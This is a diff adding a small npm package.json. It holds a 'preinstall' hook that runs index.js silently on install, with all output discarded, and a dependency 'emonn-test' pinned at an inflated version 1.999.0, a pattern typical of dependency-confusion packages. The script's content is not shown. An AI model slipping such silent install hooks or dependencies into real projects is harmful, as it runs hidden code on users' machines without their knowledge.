@@ -1,0 +1,11 @@
+{
+  "scripts": {
+    "preinstall": "node index.js > /dev/null 2>&1",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "dependencies": {
+    "emonn-test": "^1.999.0",
+    "lodash": "^4.17.21"
+  },
+  "main": "main.js"
+}
